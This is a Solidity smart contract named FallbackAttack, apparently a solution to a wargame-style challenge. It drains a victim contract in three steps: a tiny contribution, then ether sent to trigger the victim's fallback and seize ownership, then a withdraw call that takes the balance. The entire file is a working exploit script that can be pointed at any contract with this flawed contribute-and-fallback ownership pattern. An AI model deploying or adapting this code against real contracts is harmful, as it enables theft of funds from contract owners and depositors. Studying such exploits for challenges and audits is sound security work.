// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

contract FallbackAttack {
    address payable public attacker;
    bytes4 private constant CONTRIBUTE_SELCTOR = bytes4(keccak256(bytes("contribute()")));
    bytes4 private constant WITHDRAW_SELECTOR = bytes4(keccak256(bytes("withdraw()")));

    constructor() {
        attacker = payable(msg.sender);
    }

    modifier onlyAttacker() {
        require(msg.sender == attacker, "FallbackAttack: Only attacker can perform the action.");
        _;
    }

    function attack(address _victim) external payable onlyAttacker {
        require(msg.value >= 0.001 ether, "FallbackAttack: Not enough ethers to attack.");

        bool success;
        /// @notice - STEP 1: contribute for a very small amount of ether:
        (success, ) = _victim.call{value: 0.0001 ether}(abi.encodeWithSelector(CONTRIBUTE_SELCTOR));
        require(success, "FallbackAttack: Contribution failed.");

        /// @notice - STEP 2: call the fallback function by sending ether to the contract
        (success, ) = _victim.call{value: 0.0001 ether}("");
        require(success, "FallbackAttack: Send Ether failed.");

        /// @notice - STEP 3: withdraw funds
        (success, ) = _victim.call(abi.encodeWithSelector(WITHDRAW_SELECTOR));
        require(success, "FallbackAttack: Withdraw failed.");
    }

    receive() external payable {}
}
